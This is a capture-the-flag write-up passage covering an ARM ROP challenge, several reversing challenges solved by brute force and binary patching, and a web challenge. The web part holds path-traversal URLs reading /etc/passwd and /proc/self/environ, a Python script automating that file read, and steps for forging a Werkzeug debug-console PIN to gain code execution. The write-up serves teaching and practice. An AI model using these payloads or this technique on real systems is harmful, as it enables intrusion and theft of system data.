We can also see that no protection is enabled!

If you try to execute it, you'll probably get an error because you can't run an ARM executable on an Intel processor

So we need an environment that would enable us to execute and debug it

For me i went with emulating using qemu you can find more [here](https://azeria-labs.com/arm-on-x86-qemu-user/)

```
- sudo apt install gcc-arm-linux-gnueabihf binutils-arm-linux-gnueabihf binutils-arm-linux-gnueabihf-dbg
- sudo apt install gdb-multiarch qemu-user
```

For the gdb debugging i used [gef](https://github.com/hugsy/gef)

Now let's get to it

Running the binary to get an overview of what it does shows this
![image](https://github.com/user-attachments/assets/a3fd4aac-d90f-44f0-b3f4-3713dc092be0)

Okay nothing much, loading it up in IDA shows this
![image](https://github.com/user-attachments/assets/a30e36e9-3047-42b3-94ec-afbcdae5b725)

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // r3
  char s[64]; // [sp+Ch] [bp-48h] BYREF
  int v6; // [sp+4Ch] [bp-8h]

  v6 = 0;
  gets(s);
  if ( v6 )
    puts("you have changed the 'modified' variable");
  else
    puts("Try again?");
  return v3;
}
```

So it receives our input, checks if the integer variable has been overwritten and then prints a message regarding that

Okay nothing much here and the vulnerability is obvious, we have a buffer overflow because it uses `gets()` if you wanna know why it's that check the man page of `gets` at the `BUG` section

What now?

I looked at the available functions and saw this

![image](https://github.com/user-attachments/assets/861d54e1-b5b3-488c-9406-f448e09a3e29)

So there's no easy win function for us to jump to 😢

This means we need to ROP

There are two ways i actually attempted to solve this:
- First i did ret2shellcode because i noticed that even though ASLR is turned on the stack is always at a constant address for some reason and basically since NX is disabled this means the stack is rwx. With that I overwrote the instruction pointer to the start of the buffer which holds our shellcode and that worked! I then built a docker container based on the Dockerfile provided to replicate this and i noticed that the stack address changed but it's always at a constant value fixing my exploit to use the new stack works but yet again running the exploit when the binary is ran with socat doesn't work
- Next thing i tried was to ROP because i opened a ticket and the admins said that ret2shellcode wasn't the intended solution since he forgot to enable NX

Now how do we ROP?

I am familiar with x86_64 rop but not ARM so i did a little bit of research on ARM assembly because rop is pretty much chaining instructions present in the binary to perform stuffs like spawnning shell etc.

Using this arm assembly [tutorial](https://azeria-labs.com/writing-arm-assembly-part-1/) by Azeria i learnt some few things which i needed to solve the challenge

The first thing we need to know is the set of registers present in an ARM processor
![image](https://github.com/user-attachments/assets/90871517-b921-4c8c-9636-31b7d345e346)
![image](https://github.com/user-attachments/assets/08356d21-2305-425f-b5a3-bd19d025e784)

Now some quick idea on the instruction set 
![image](https://github.com/user-attachments/assets/b3dec406-74cc-4a9f-8bce-faafe023afa6)

Ok good now time to look for rop gadgets

I wasn't able to get any using [ropper](https://github.com/sashs/Ropper) but [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) worked fine
![image](https://github.com/user-attachments/assets/c3b92de3-ca20-4660-ba5f-1345853c3803)
![image](https://github.com/user-attachments/assets/f478f34f-0b67-453d-8bf1-227f0f892545)
![image](https://github.com/user-attachments/assets/fbdfc5e9-77a7-49c4-b035-9e772f3a1290)

So our goal is to call `system('/bin/sh')` so first let us determine the offset needed to overwrite the `pc` register

This is how i did it, first i setup gdb server using qemu

```
qemu-arm -g 5000 ./arm_and_a_leg
```

Next :
- loaded `gdb-multiarch` on the binary `arm_and_a_leg`
- generated a cyclic pattern of 100 bytes
- connected to the gdb server listening on port 5000

Here's the command:

```
- gdb-multiarch arm_and_a_leg
- pattern create 200
- target remote :5000
- continue
```

This is how it is after doing that
![image](https://github.com/user-attachments/assets/e628df2c-9de0-43b6-9199-c1ff07dfa01c)

We can see that the `$pc` register holds `0x61616172`, now we can just get the offset of that
![image](https://github.com/user-attachments/assets/9301d2a0-957d-4cd7-9f3a-b4bfbc2b9d20)

Later on i figured we needed to add 4 more bytes which makes our offset 72, i really don't know the reason why it's that way 😅

So what now? first we need to leak libc because system wasn't resolved in the binary and because the system function resides in libc we need to get the libc base

How do we achieve that? Well we can leak it by calling `puts@plt(puts@got)` thereby leaking the value stored in the got of puts which points to the puts function in libc

To do that we need to control `r0` which is the first parameter, after looking through the gadgets shown by ROPgadget i really couldn't find any one that would work so what now

Luckily i did `info func` and saw this
![image](https://github.com/user-attachments/assets/b54751b5-1baa-4df3-8b44-54b276ca3719)

We can see that it has a `__libc_csu_init` function and from my knowledge on 64 bits rop i knew that this could be used to control the rdi, rsi, rdx registers if there's no gadget to control it using a technique known as ret2csu

So i just researched on arm ret2csu and found this really helpful [blog](https://gbyolo.gitlab.io/posts/2020/07/ret2csu-arm-32bit/)

My solution is pretty much based on that as it enabled me to control the r0 register and thereby leaking libc

From there it was pretty much straight forward this is how it goes:
- Leak libc
- Return back to main for second stage exploitation
- Call system on /bin/sh
- Profit

Doing that works!
![image](https://github.com/user-attachments/assets/d4b010af-03fa-4281-a013-1e8aac16ff13)

```
Flag: r00t{It_4lw4y5_c05t5_4n_4rm_4nd_4_l39_245ef81}
```

### Rev 6/6 :~

#### Re-Incarnation 

We are given this binary and the supposedly encrypted flag 
![image](https://github.com/user-attachments/assets/7926d733-df51-4e49-9b9f-51ca2e14bc7e)
![image](https://github.com/user-attachments/assets/898b712a-4b94-432e-93ce-c0ce37fe06c5)

First thing i did was to check what language it's written in using [DiE](https://github.com/horsicq/Detect-It-Easy)
![image](https://github.com/user-attachments/assets/febe36ce-62ad-4c8d-9cfd-d0b1d6b31657)

Compiled with GCC and it was written in either C or C++

Running it shows this
![image](https://github.com/user-attachments/assets/3ceebcdc-1813-4c95-b770-0458c72fedf2)

Seems it recevies our input then generates some number based on that input

Loading it up in IDA here's the main function
![image](https://github.com/user-attachments/assets/0ed15042-34f5-4d8d-a9a7-e8c5af9ae8c7)

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+Ch] [rbp-74h]
  _BYTE v5[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v6; // [rsp+78h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  printf("Enter a string: ");
  __isoc99_scanf("%99s", v5);
  for ( i = 0; v5[i]; ++i )
  {
    generate_character((char)v5[i]);
    printf("%lu \n", glob_canary);
  }
  putchar(10);
  return 0;
}
```

So it's just like we assumed, it takes in a string and for each character in that string it generates a certain number

Let us take a look at the `generate_character` function
![image](https://github.com/user-attachments/assets/dffc7927-6459-4164-8a92-55b7a1b72d83)

```c
__int64 __fastcall generate_character(unsigned __int64 a1)
{
  __int64 v1; // rax
  __int64 result; // rax
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  if ( !a1 )
  {
    puts("Invalid entry. Exiting");
    exit(-1);
  }
  v3 = 8 * ((16 * (a1 >> 5) * ((a1 >> 5) ^ (8 * a1)) + (a1 >> 5)) >> 2);
  v1 = 2 * (v3 ^ (4 * (a1 >> 5) * ((a1 >> 5) ^ (8 * a1)) - (unsigned __int16)(a1 >> 5)))
     + (unsigned __int16)(v3 ^ (16 * (a1 >> 5) * ((a1 >> 5) ^ (8 * a1)) + (a1 >> 5)));
  result = v1 * v1;
  glob_canary = result;
  return result;
}
```

Ok cool it seems to just do some math operations on the character provided and the result is then returned

The best way to solve this is via brute force since no sane person would want to reverse that operation if it's possible

There are probably multiple ways to go about it 

First we can perform a brute force using the binary as the oracle or just reimplement that function and brute force

Here's what i mean for the first choice
![image](https://github.com/user-attachments/assets/4a077a01-405e-4d34-bf4a-82af646e3df6)

We can basically tell the program to check if the value it generated equals the expected value and if it is then that means the character we gave in is a valid flag character

But that's just stressful so here's a more easier approach:
- We encrypt all printable characters and then we do a reverse mapping based on the result returned and our encrypted flag

Here's my solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/perfectr00t24/scripts/Re-Incarnation/solve.py)

```python
import string
from pwn import *
import ast

charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}_"
enc_str = open("flag.txt").read().split()
enc = [int(item) for item in enc_str]
flag = ""


io = process("./re-incarnation")
io.sendline(charset.encode())
io.recvuntil(b": ")
r = io.recvall().splitlines()
io.close()

numbers = [int(item.strip()) for item in r if item != b""] 
mapping = {num: char for char, num in zip(charset, numbers)}
flag = ""

for val in enc:
    flag += mapping[val]

print(flag)
```

Running it gives the flag
![image](https://github.com/user-attachments/assets/abf53162-9828-4290-b36d-f2bb20ec011b)


```
Flag: r00t{Pl3453_73ll_m3_y0u_d1d_n07_bru73f0rc3_288a858f9}
```

#### Go Dark
![image](https://github.com/user-attachments/assets/683b5c19-0e7d-4753-9a2c-ad4ae6143931)

Hmm the description says this isn't a C binary so we can guess it's a Golang binary from the challenge name

Anyways checking the file with Detect It Easy shows this
![image](https://github.com/user-attachments/assets/b9f98ee2-d941-4a18-a0e0-f9754095b62e)
![image](https://github.com/user-attachments/assets/c7ff3b2e-d086-4753-9cc0-acce68bb542f)

As we expected this is a Golang binary

Running it shows this
![image](https://github.com/user-attachments/assets/7dcbe472-b7af-415f-b9a1-44a4a99a55ce)

It just seems to do nothing

If we monitor the system calls with strace we'd see it really does nothing but just exits
![image](https://github.com/user-attachments/assets/eed793e4-0ce4-4af8-852f-638c98fc1cb2)
![image](https://github.com/user-attachments/assets/87f65e0f-3f2f-46f9-bc36-d9ae79a7b5ad)

Loading it up in IDA shows this luckily debug_info was enabled and here's the main function
![image](https://github.com/user-attachments/assets/1dbcecce-ca16-4e2d-8ffc-7f486a1eee37)

We can see that before it calls the `printFlag` function it would exit as shown from the result of strace

Meaning we need to call that function but what's a more easier way?

Well we can just patch the call to `os_Exit`
![image](https://github.com/user-attachments/assets/de087934-17db-4027-9d12-c604ccd937ba)
![image](https://github.com/user-attachments/assets/3cc9dd9d-b7a8-4f58-86b4-405deda28439)

How i patched it was by clicking on the instruction then checking the hex view and modifying the bytecode to nops
![image](https://github.com/user-attachments/assets/ef82250a-35d1-435c-bb15-585b8014f0fe)

Let us save the applied patch and we can do this by checking `Edit -> Patch Program -> Apply changes to input file`

Doing that we can then get the flag by simply running the binary
![image](https://github.com/user-attachments/assets/98134822-65fc-4d3c-aed3-a06e024bad8c)

The `printFlag` function itself does a simple xor operation on an integer array so you can as just reimplement it

```c
// main.printFlag
// local variable allocation has failed, the output may be wrong!
void __golang main_printFlag()
{
  __int64 v0; // rcx OVERLAPPED
  __int64 v1; // rdi OVERLAPPED
  int v2; // r8
  error_0 v3; // r9
  __int128 v4; // xmm15
  __int64 i; // rax
  void *v6; // rcx
  __int64 v7; // rsi
  _slice_interface__0 *p_a; // rcx
  int v9; // r8
  __int64 v10; // [rsp+0h] [rbp-110h]
  _QWORD v11[30]; // [rsp+8h] [rbp-108h]
  _slice_interface__0 a; // [rsp+F8h] [rbp-18h] BYREF
  error_0 v13; // 0:r9.16
  string_0 v14; // 0:rax.8,8:rbx.8
  io_Writer_0 v15; // 0:rax.8,8:rbx.8
  _slice_interface__0 v16; // 0:rcx.8,8:rdi.16

  v11[0] = 122LL;
  v11[1] = 56LL;
  v11[2] = 56LL;
  v11[3] = 124LL;
  v11[4] = 115LL;
  v11[5] = 125LL;
  v11[6] = 111LL;
  v11[7] = 125LL;
  v11[8] = 102LL;
  v11[9] = 124LL;
  v11[10] = 125LL;
  v11[11] = 87LL;
  v11[12] = 111LL;
  v11[13] = 56LL;
  v11[14] = 97LL;
  v11[15] = 102LL;
  v11[16] = 111LL;
  v11[17] = 87LL;
  v11[18] = 124LL;
  v11[19] = 56LL;
  v11[20] = 87LL;
  v11[21] = 124LL;
  v11[22] = 96LL;
  v11[23] = 109LL;
  v11[24] = 87LL;
  v11[25] = 122LL;
  v11[26] = 56LL;
  v11[27] = 56LL;
  v11[28] = 124LL;
  v11[29] = 117LL;
  for ( i = 0LL; i < 30; i = v10 + 1 )
  {
    v10 = i;
    *(_OWORD *)&a.array = v4;
    v14.len = v11[i] ^ 8LL;
    runtime_intstring(0LL, v14.len, *(string_0 *)&v0);
    runtime_convTstring(v14, v6);
    a.array = (interface__0 *)&RTYPE_string;
    a.len = (int)v14.str;
    v14.len = (int)os_Stdout;
    v14.str = (uint8 *)&go_itab__ptr_os_File_comma_io_Writer;
    v1 = 1LL;
    v7 = 1LL;
    p_a = &a;
    fmt_Fprint((io_Writer_0)v14, *(_slice_interface__0 *)(&v1 - 1), v9, v13);
  }
  v15.data = os_Stdout;
  v15.tab = (internal_abi_ITab *)&go_itab__ptr_os_File_comma_io_Writer;
  v16.array = 0LL;
  *(_OWORD *)&v16.len = 0uLL;
  fmt_Fprintln(v15, v16, v2, v3);
}
```

An alternative [solve](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/perfectr00t24/scripts/Go%20Dark/solve.py)

```python
from pwn import xor

v11 = bytearray(30)
v11[0] = 122;
v11[1] = 56;
v11[2] = 56;
v11[3] = 124;
v11[4] = 115;
v11[5] = 125;
v11[6] = 111;
v11[7] = 125;
v11[8] = 102;
v11[9] = 124;
v11[10] = 125;
v11[11] = 87;
v11[12] = 111;
v11[13] = 56;
v11[14] = 97;
v11[15] = 102;
v11[16] = 111;
v11[17] = 87;
v11[18] = 124;
v11[19] = 56;
v11[20] = 87;
v11[21] = 124;
v11[22] = 96;
v11[23] = 109;
v11[24] = 87;
v11[25] = 122;
v11[26] = 56;
v11[27] = 56;
v11[28] = 124;
v11[29] = 117;

key = 8

print(xor(v11, key))
```

Running it gives the flag
![image](https://github.com/user-attachments/assets/478bfefa-73d9-44e9-806d-a5d22bd4ef27)

```
Flag: r00t{uguntu_g0ing_t0_the_r00t}
```

#### Box
![image](https://github.com/user-attachments/assets/e66a8efc-b180-46fd-8741-39a111368258)

We are given a web url and a binary hmmm

Let us check it out, from the file type details we can tell this is another Goland compiled binary
![image](https://github.com/user-attachments/assets/ef5bcb0e-989a-442a-a6f7-e3184e694ab4)
![image](https://github.com/user-attachments/assets/9669b162-02df-4c1e-9cae-a868a7ed84cc)

Running it shows this
![image](https://github.com/user-attachments/assets/3803c46b-3827-416f-9179-e72e27cebf36)

First thing that caught my attention is the debug log

I looked it up: `GIN-debug` and got [this](https://github.com/gin-gonic/gin/blob/master/debug.go)
![image](https://github.com/user-attachments/assets/b06f5bee-9b68-4465-bff8-e6fd6425c080)

So it's a HTTP web framework written in Go

Just incase i'll let you know i don't know Go language so i won't go deep in explaining things because i myself don't understand much

Anyways we can see that it defined some routes and it's handles

```
[GIN-debug] GET    /                         --> main.indexHandler (3 handlers)
[GIN-debug] GET    /Z2V0RmxhZwo=             --> main.getFlagHandler (3 handlers)
[GIN-debug] POST   /Z2V0RmxhZwo=             --> main.getFlagHandler (3 handlers)
[GIN-debug] GET    /aGVsbG9Xb3JsZAo=         --> main.helloWorldHandler (3 handlers)
[GIN-debug] GET    /c2F5bmFtZQo=             --> main.sayNameHandler (3 handlers)
[GIN-debug] POST   /c2F5bmFtZQo=             --> main.sayNameHandler (3 handlers)
[GIN-debug] GET    /YWJvdXQK                 --> main.aboutHandler (3 handlers)
```

Based on those routes it would call the handler

Our interest if obviously `main.getFlagHandler`

But let us just get an overview of the various result from accessing the routes

Index handler:
![image](https://github.com/user-attachments/assets/28ffb99e-e7af-4287-9979-3af5e9c7ac7e)

GetFlag handler:
![image](https://github.com/user-attachments/assets/69b387c5-3cf5-4b09-83bb-e7e726950d2f)

HelloWorld handler:
![image](https://github.com/user-attachments/assets/f78fa21e-89fa-4303-b966-2d62e3d08471)

About handler:
![image](https://github.com/user-attachments/assets/f05b46dd-8bd1-45c2-8e29-54454c7bb82e)

SayName handler:
![image](https://github.com/user-attachments/assets/5d462306-86d9-4709-bb5d-a4cb111caf82)

Opening the binary in IDA we can see the list of functions defined in main and they all correspond to the handlers
![image](https://github.com/user-attachments/assets/8683233a-62b0-44e0-b8f0-6f91e221bd8f)

Our interest is that of `main.getFlagHandler`
![image](https://github.com/user-attachments/assets/3a6e03a4-4af0-49c8-9667-6ed80c6e472c)

Here's the pseudocode
![image](https://github.com/user-attachments/assets/5d256e3c-ec01-4556-8cb5-c16dd2ccf869)
![image](https://github.com/user-attachments/assets/bbcde92f-c120-4edc-9781-5d1b2007441b)
![image](https://github.com/user-attachments/assets/ed2ef805-e2d7-4d1f-9c43-6137749c5e83)

Now as you may have noticed it's not exactly nice in the eye but it's way more better than looking at a stripped version with no debug info

So i'll just go through it briefly:
- First it checks the request method length if it equals 4 or the method is `POST` and if that's not the case it goes to `LABEL_5` which is the part that prints the fake flag
- This means our main check is going to be triggered via a post request
- If the request method is post:
    - It's going to make sure the content type is application/json
    - Moving forward it's going to basically check the content of the json data to see if the key field is the same as the expected one
    - And then there's a `memequal` call that compares our json data value with some hardcoded one, if it's equal it opens up the flag and prints it out
    - If we fail any of the above check it would just print that fake flag

More of how i figured that was gotten via debugging which i don't want to show here because it's tedious

In anycase we know that it:
- expects a valid json data in the request body
- makes sure that the json key matches the correct type
- compares the json value with some hardcoded one

Now we need to figure the expected json key and value

Looking at the comparism portion in the disassembly i got this
![image](https://github.com/user-attachments/assets/4ab71d4c-7858-4239-b4ee-771dd3a263c1)

So it's clear that our expected value should be `r00t{LITERALLY_FAKE_FLAG}` 

To get the expected key i saw it was loading `&byte_888503` and on clicking it i got this
![image](https://github.com/user-attachments/assets/5ef57a91-fb98-4dda-a0ad-8f5c0113e14e)

This looks very much like a character array so i converted it to string and got this
![image](https://github.com/user-attachments/assets/cf141458-a362-41be-8bb1-a59d0699bfb3)

It seems to merge all strings together but nevertheless we now know the expected key which is `secret_key`

To solve we just make the expected post request and doing that i got the flag
![image](https://github.com/user-attachments/assets/1a302ffb-6a86-49f5-9ca0-1d9c7c39b7ab)

```
POST /Z2V0RmxhZwo= HTTP/1.1
Host: 94.72.112.248:61337
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Length: 42
Content-Type: application/json;charset=UTF-8

{"secret_key":"r00t{LITERALLY_FAKE_FLAG}"}
```

Got the flag

```
Flag: r00t{you_4re_kind@_sm4rt_t0_be_H#R#}
```

#### Pores
![image](https://github.com/user-attachments/assets/cf4068c1-f280-4942-96e8-c6f7ae8042e3)

Let us do our standard checks
![image](https://github.com/user-attachments/assets/858aec31-4a92-4966-a572-40ca9fb75dd6)
![image](https://github.com/user-attachments/assets/16c7aa60-6298-4563-80d2-5b5c71067676)

Nothing out of the ordinary

Running it shows this
![image](https://github.com/user-attachments/assets/ecfd2ff4-9974-4322-8add-1614ee394aae)

Similarly to `Go Dark` let us run strace
![image](https://github.com/user-attachments/assets/4ad8fa1b-016c-40d1-98d5-540d0494d29e)

Yet again we see it does nothing!

Loading it up in IDA shows this
![image](https://github.com/user-attachments/assets/f691a0e5-bf73-467b-95b7-09714acf4301)

Hmmm it doesn't seem to do anything and why's that?

Well let us take a look at the disassembly
![image](https://github.com/user-attachments/assets/f12b8930-cb0c-471d-9b44-2fc9ca429a17)

From IDA's nice graph view we can see the following instructions:

```c
mov [rbp-4], 0
cmp [rbp-4], 1
jnz return
mov esi, 8
lea rax, flag
mov rdi, rax
call printFlag
```

We can simply see that we would never get the flag because after it initializes the variable to 0 it compares it to 1 which is never going to be True thus jumping to the portion where the program returns

Also if the check is True then it sets up the register for calling the `printFlag` function where `rdi` points to the address of the flag and rsi is set to 8

So how do we solve this?

Well i yet again patched it

We can simply patch the `jnz` instruction to a `jz` instruction
![image](https://github.com/user-attachments/assets/f3b7b083-d552-4f6a-86ac-2fbba5f4f5bf)
![image](https://github.com/user-attachments/assets/4846d706-3c52-4d66-b218-0c670c2b35cd)

```
Edit -> Patch Program -> Assemble
```

Now we save the patch like we did previously

To get the flag, we simply just execute the binary
![image](https://github.com/user-attachments/assets/9a642b5d-7c2e-4828-aea0-ee5d4579b52c)

```
Flag: r00t{p4tch_th3_bin_and_h4ve_fun}
```

### Web 1/5 :~

#### Console-idation
![image](https://github.com/user-attachments/assets/c24de159-ef49-4aed-998b-64e6114a6798)

Going over to the url provided shows this
![image](https://github.com/user-attachments/assets/de9fc184-e726-472a-96c7-14ecbef3fee2)

I tried stuffs like sql injection but it didn't work so i created an account

After login in i saw this
![image](https://github.com/user-attachments/assets/d9377dc5-7dc3-4096-92ce-2c6894ba7c8a)

Seems we can read another poem and on doing that i noticed the url
![image](https://github.com/user-attachments/assets/ffaaa0df-4b8e-4d83-9bf0-86f860448834)

It looks like it's directly getting the poem from `/` and with this i decided to play around with local file inclusion

After some time trying some payload this worked for me:
![image](https://github.com/user-attachments/assets/b7339337-506d-487a-b1f3-e12394757caa)

```
http://94.72.112.248:10011/dashboard?file=....//....//....//....//etc/passwd
```

Ok now what?

The web app is a python based server but uses nginx as the reverse proxy

How did i figure that out?

Simply by reading the environment variable
![image](https://github.com/user-attachments/assets/e484ef41-abc0-4724-90af-c69f7492805a)

```
http://94.72.112.248:10011/dashboard?file=....//....//....//....//proc/self/environ
```

Now we know that it's a werkzeug server and one thing you might try here is maybe reading the flag?

But that's not possible because i read the cmdline file and saw this
![image](https://github.com/user-attachments/assets/122f87eb-9d0d-4672-954b-84653f3cd74c)

So that executes `/start.sh` and on reading that i got this
![image](https://github.com/user-attachments/assets/dfc5f947-c67d-4e43-9b79-cd79cdf7b992)

```sh
#!/bin/sh

#secure start chmod 600 /start.sh
mv /flag.txt /flag$(cat /dev/urandom | tr -cd "a-f0-9" | head -c 10).txt

# Start your Flask app
nginx -g "daemon off;" & python3 /app/main.py
```

The flag name was randomly generated so that means we need to know it before reading it

This means we need to get RCE

One thing you should note is that the session expires after few minutes which can be annoying but i wrote a script that makes it easier to interact with the arbitrary file read

```python
import requests
from bs4 import BeautifulSoup

base_url = "http://94.72.112.248:10011"
login_endpoint = "/login"
dashboard_endpoint = "/dashboard?file=....//....//....//"

login_data = {
    "email": "a@a.com",
    "password": "a"
}

def main():
    while True:
        query = input("> ")
        if query != "q":
            with requests.Session() as session:
                login_url = f"{base_url}{login_endpoint}"
                login_response = session.post(login_url, data=login_data)
                
                query = query.replace("/", "%2f")
                dashboard_url = f"{base_url}{dashboard_endpoint}{query}"
                dashboard_response = session.get(dashboard_url)
                soup = BeautifulSoup(dashboard_response.text, "html.parser")
                content = soup.find_all("p")[1]
                print(content.get_text())
        else:
            quit()

if __name__ == "__main__":
    main()
```

We can confirm it works!
![image](https://github.com/user-attachments/assets/ceb15191-8986-4427-b7a2-6a0a296d59f7)

Now how do we get RCE?

I wanted to actually read the application source code which is located at `/app/main.py` but it didn't allow me

But because we know it's a wergzeug server and the challenge name is `console-idation` we can assume that it's running in debug mode

To confirm that we can try access `/console`
![image](https://github.com/user-attachments/assets/3a26eaad-2221-4d77-ab71-1198d94a6722)

At this point it's clear on what we should do

Basically we need to leverage the file read to generate the debug pin

You can read more on it [here](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug#werkzeug-console-pin-exploit)

I actually attempted to use an automated [exploit](https://github.com/Ruulian/wconsole_extractor) with some few modifications at first but that didn't work 

But it gave me insight on all the data i needed like the flask path which is required for the pin generation

I wrote a script alternatively to find it and you can get it [here](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/perfectr00t24/scripts/Console-idation/query.py)

But any ways here's what we need for generating the pin:

```
probably_public_bits:
- username: root
- modname: flask.app
- getattr(app, '__name__', getattr(app.__class__, '__name__')): Flask
- getattr(mod, '__file__', None): /usr/local/lib/python3.9/site-packages/flask/app.py
```

Now this is the tricky part and that's getting the `private_bits` value

I exfiltrated the `debug.py` source code from the server and you can find it [here](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/perfectr00t24/scripts/Console-idation/debug.py) because it's easier to reference what we are meant to do

For the `str(uuid.getnode())` which is the server mac address we can get that by identifying the active network interface used by the app
![image](https://github.com/user-attachments/assets/6d904160-e015-4682-aa4e-e1f078a2d716)

```
- /proc/net/arp
- /sys/class/net/eth0/address
```

From doing that we get the mac as `2485377892361` which is the equivalent to `str(uuid.getnode())` from [here](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/perfectr00t24/scripts/Console-idation/debug.py#L194)

Next we need the second value which is the `machine_id`

Since i'm a lazy person i just copy/paste the machine_id made some [modification](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/perfectr00t24/scripts/Console-idation/get_machine_id.py) and ran it 

But for it to work we need to exfiltrate three files:
![image](https://github.com/user-attachments/assets/9ce60738-8b1a-4ce3-9cef-60f5981b58df)

- /etc/machine-id
- /proc/sys/kernel/random/boot_id
- /proc/self/cgroup

Cool only the last two is available so i just saved them and ran the script
![image](https://github.com/user-attachments/assets/0b26eb84-fd28-4664-a447-4e277176834f)

Now the machine id is basically `b74d9c2d-6b44-4cae-ba65-bc72beee82ef72e167d0b32f63740bd9e2c72f1a711a59903070e41f3c6a1ca6d8e563ab16ae` and we need to add that to our final [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/perfectr00t24/scripts/Console-idation/generate.py) to get the pin 
![image](https://github.com/user-attachments/assets/09f2ffa7-998b-4cd0-b457-6f552d350479)

Using that pin worked!
![image](https://github.com/user-attachments/assets/bc5c3449-82a6-4398-8ed5-f9403883b6b0)

And now we can get code execution and read the flag
![image](https://github.com/user-attachments/assets/d81fda06-b3fe-4050-b641-9dba17f599d1)

```
Flag: r00t{069aba00c086ad9da32ddd8e9}
```













